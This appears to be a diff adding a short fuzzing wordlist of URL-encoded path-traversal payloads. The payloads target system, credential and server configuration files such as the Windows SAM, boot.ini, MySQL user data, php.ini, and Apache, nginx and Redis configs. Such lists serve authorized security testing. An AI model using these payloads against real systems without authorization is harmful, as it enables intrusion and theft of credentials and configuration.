@@ -1,0 +1,16 @@
+..%2F..%2F..%2F..%2Fboot.ini
+..%2F..%2F..%2F..%2FMetaBase.xml
+..%2F..%2F..%2F..%2Fsam
+..%2F..%2F..%2F..%2Fmy.ini
+..%2F..%2F..%2F..%2Fuser.MYD
+..%2F..%2F..%2F..%2Fphp.ini
+..%2F..%2F..%2F..%2Fmy.ini
+..%2F..%2F..%2F..%2Fetc%2Fhttpd%2Fconf%2Fhttpd.conf
+..%2F..%2F..%2F..%2Fetc%2Fapache2%2Fhttpd.conf
+..%2F..%2F..%2F..%2Fetc%2Fapache2%2Fapache2.conf
+..%2F..%2F..%2F..%2Fetc%2Fnginx%2Fnginx.conf
+..%2F..%2F..%2F..%2Fusr%2Flocal%2Fnginx%2Fconf%2Fnginx.conf
+..%2F..%2F..%2F..%2Fusr%2Flocal%2Fetc%2Fnginx%2Fnginx.conf
+..%2F..%2F..%2F..%2Fetc%2Fredis.conf
+..%2F..%2F..%2F..%2Fetc%2Fredis%2Fredis.conf
+..%2F..%2F..%2F..%2Fweb.xml
